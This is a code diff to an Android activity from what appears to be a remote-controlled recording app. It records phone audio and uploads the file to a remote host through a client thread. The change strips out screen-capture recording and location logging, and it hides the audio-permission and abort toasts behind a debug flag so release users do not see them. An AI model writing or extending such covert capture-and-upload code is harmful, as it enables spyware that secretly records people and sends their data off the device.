@@ -7,7 +7,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
 import android.content.pm.PackageManager;
-import android.media.projection.MediaProjectionManager;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Build;
@@ -23,43 +22,34 @@ import android.widget.Toast;
 
 import com.view.core.MyApplication;
 import com.view.core.aidl.OnPhoneRecordListener;
-import com.view.core.aidl.OnScreenRecordListener;
 import com.view.core.aidl.PhoneRecord;
-import com.view.core.aidl.ScreenRecord;
 import com.view.core.services.PhoneRecordBinder;
 import com.view.core.services.PhoneService;
-import com.view.core.services.ScreenRecordBinder;
-import com.view.core.services.ScreenRecordService;
 import com.view.core.thread.ClientThread;
 import com.view.core.thread.Constant;
 import com.view.core.utils.LocationUtil;
-import com.view.core.utils.ScreenRecordUtil;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.IOException;
-import java.io.InputStreamReader;
 
 import Android.view.core.R;
 
 import static android.support.v4.content.PermissionChecker.PERMISSION_DENIED;
 
 
-public class MainActivity extends Activity {
+public class PhoneRecordActivity extends Activity {
 
     private static final String TAG = ClientThread.class.getSimpleName();
 
-    private Context mContext = MainActivity.this;
-    private int REQUEST_SCREEN_PERMISSION_RESULT = 1;
-    private int REQUEST_RECORD_PERMISSION_RESULT = 2;
+    private Context mContext = PhoneRecordActivity.this;
+    private int REQUEST_RECORD_PERMISSION_RESULT = 1;
 
     private String mPhoneFile;
-    private String mScreenFile;
 
     private String remoteHost;
 
@@ -68,7 +58,6 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main_activity);
-        ScreenRecordUtil.getInstance().initScreenRecordManager(this);
 
         Bundle bundle = getIntent().getBundleExtra("data");
         if(bundle != null)
@@ -80,13 +69,6 @@ public class MainActivity extends Activity {
             Intent intent = new Intent(this, PhoneService.class);
             bindService(intent, getPhoneServiceConnection(), BIND_AUTO_CREATE);
         }
-
-        double[] location = LocationUtil.getInstance().getLocationInfo();
-        if(location != null)
-            Log.d(TAG, "onCreate: location="+ location[0]+ ", "+ location[1]);
-        location = LocationUtil.getInstance().getLastLocationInfo();
-        if(location != null)
-            Log.d(TAG, "onCreate: last location="+ location[0]+ ", "+ location[1]);
 
         ((TextView)findViewById(R.id.content)).setText(getlocalip());
     }
@@ -124,45 +106,6 @@ public class MainActivity extends Activity {
         return connection;
     }
 
-    private ServiceConnection getScreenServiceConnection(){
-        ServiceConnection connection = ((MyApplication)getApplication()).getScreenServiceConnection();
-        if(connection == null){
-            connection = new ServiceConnection() {
-                private ScreenRecord binder;
-                @Override
-                public void onServiceConnected(ComponentName name, IBinder service) {
-                    Log.d(TAG, "onServiceConnected: the screen service is binded");
-                    binder = ScreenRecordBinder.asInterface(service);
-                    Bundle param = new Bundle();
-                    param.putString("KEY_FILE_PATH", "/mnt/sdcard/screen_record.mp4");
-                    param.putInt("KEY_DISPLAY_WIDTH", ScreenRecordUtil.getInstance().getScreenWidth());
-                    param.putInt("KEY_DISPLAY_HEIGHT", ScreenRecordUtil.getInstance().getScreenHeight());
-                    param.putInt("KEY_DISPLAY_DPI", ScreenRecordUtil.getInstance().getScreenDpi());
-                    param.putInt("KEY_RECORD_RESULT_CODE", mResultData);
-                    param.putParcelable("KEY_RECORD_RESULT_DATA", mData);
-                    try {
-                        binder.initRecordService(param, mListener);
-                        binder.startRecord();
-                    } catch (RemoteException e) {
-                        e.printStackTrace();
-                    }
-                }
-                @Override
-                public void onServiceDisconnected(ComponentName name) {
-                    if(binder != null){
-                        try {
-                            binder.stopRecord();
-                        } catch (RemoteException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                }
-            };
-            ((MyApplication)getApplication()).setScreenServiceConnection(connection);
-        }
-        return connection;
-    }
-
     private String getlocalip() {
         WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
         WifiInfo wifiInfo = wifiManager.getConnectionInfo();
@@ -189,8 +132,10 @@ public class MainActivity extends Activity {
                 return true;
             } else {
                 if (shouldShowRequestPermissionRationale(Manifest.permission.RECORD_AUDIO)) {
-                    Toast.makeText(this,
-                            "App required access to audio", Toast.LENGTH_SHORT).show();
+                    if(Constant.isDebug) {
+                        Toast.makeText(this,
+                                "App required access to audio", Toast.LENGTH_SHORT).show();
+                    }
                 }
                 this.requestPermissions(new String[]{
                         Manifest.permission.RECORD_AUDIO,
@@ -216,7 +161,9 @@ public class MainActivity extends Activity {
         @Override
         public void onRecordStop(int code) throws RemoteException {
             Log.d(TAG, "onRecordStop: code="+ code);
-            Toast.makeText(mContext, "中止操作" ,Toast.LENGTH_SHORT).show();
+            if(Constant.isDebug) {
+                Toast.makeText(mContext, "中止操作", Toast.LENGTH_SHORT).show();
+            }
         }
 
         @Override
@@ -228,23 +175,6 @@ public class MainActivity extends Activity {
         public void onRecordSuccess(String filePath) throws RemoteException {
             Log.d(TAG, "onRecordSuccess: path="+ filePath);
             mPhoneFile = filePath;
-
-            if (ScreenRecordUtil.getInstance().isScreenRecordEnable()){
-                MediaProjectionManager mediaProjectionManager
-                        = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-                if (mediaProjectionManager != null){
-                    Log.d(TAG, "onRecordSuccess: request permission");
-                    Intent intent = mediaProjectionManager.createScreenCaptureIntent();
-                    PackageManager packageManager = getPackageManager();
-                    if (packageManager.resolveActivity(intent,PackageManager.MATCH_DEFAULT_ONLY) != null){
-                        //存在录屏授权的Activity
-                        startActivityForResult(intent, REQUEST_SCREEN_PERMISSION_RESULT);
-                    }else {
-                        Toast.makeText(mContext, "权限获取失败！" ,Toast.LENGTH_SHORT).show();
-                    }
-                }
-            }
-            unbindService(getPhoneServiceConnection());
         }
 
         @Override
@@ -259,6 +189,8 @@ public class MainActivity extends Activity {
                 if(thread != null) thread.hangUp(false);
                 Thread.sleep(1000);
                 uploadFile(mPhoneFile, Constant.TYPE_PHONE);
+
+                unbindService(getPhoneServiceConnection());
             } catch (JSONException e) {
                 e.printStackTrace();
             } catch (InterruptedException e) {
@@ -272,22 +204,6 @@ public class MainActivity extends Activity {
         }
     };
 
-    private Intent mData;
-    private int mResultData;
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        Log.d(TAG, "onActivityResult: request="+ requestCode+ ", result="+ resultCode);
-        if (requestCode == REQUEST_SCREEN_PERMISSION_RESULT && resultCode == Activity.RESULT_OK){
-            mResultData = resultCode;
-            mData = data;
-            Log.d(TAG, "onActivityResult: start to screen service...");
-            Intent intent = new Intent(this, ScreenRecordService.class);
-            bindService(intent,  getScreenServiceConnection(), BIND_AUTO_CREATE);
-        } else {
-            Toast.makeText(this,"拒绝录屏", Toast.LENGTH_SHORT).show();
-        }
-    }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
@@ -296,10 +212,6 @@ public class MainActivity extends Activity {
             Log.d(TAG, "start phone service...");
             Intent intent = new Intent(this, PhoneService.class);
             bindService(intent,  getPhoneServiceConnection(), BIND_AUTO_CREATE);
-        }else if(requestCode == REQUEST_SCREEN_PERMISSION_RESULT){
-            Log.d(TAG, "onActivityResult: start to screen service...");
-            Intent intent = new Intent(this, ScreenRecordService.class);
-            bindService(intent,  getScreenServiceConnection(), BIND_AUTO_CREATE);
         }else{
             for (int temp : grantResults) {
                 if (temp == PERMISSION_DENIED) {
@@ -309,50 +221,6 @@ public class MainActivity extends Activity {
         }
     }
 
-
-    private OnScreenRecordListener mListener = new OnScreenRecordListener() {
-        @Override
-        public void onRecordStart() throws RemoteException {
-
-        }
-
-        @Override
-        public void onRecordStop(int code) throws RemoteException {
-            Toast.makeText(mContext, "中止操作" ,Toast.LENGTH_SHORT).show();
-        }
-
-        @Override
-        public void updateProgress(int current, int max, String message) throws RemoteException {
-
-        }
-
-        @Override
-        public void onRecordSuccess(String filePath) throws RemoteException {
-            Log.d(TAG, "onRecordSuccess: file path="+ filePath);
-            mScreenFile = filePath;
-            try {
-                ClientThread thread = ((MyApplication)getApplication()).getRemoteClient();
-                if(thread != null) thread.hangUp(false);
-                Thread.sleep(1000);
-                uploadFile(mScreenFile, Constant.TYPE_SCREEN);
-            } catch (JSONException e) {
-                e.printStackTrace();
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-            unbindService(getScreenServiceConnection());
-        }
-
-        @Override
-        public void onRecordError(int errCode, String message) throws RemoteException {
-
-        }
-
-        @Override
-        public IBinder asBinder() {
-            return null;
-        }
-    };
 
     private void uploadFile(String filePath, String fileType) throws JSONException {
         Log.d(TAG, "uploadFile: path="+ filePath+ ", type="+ fileType);
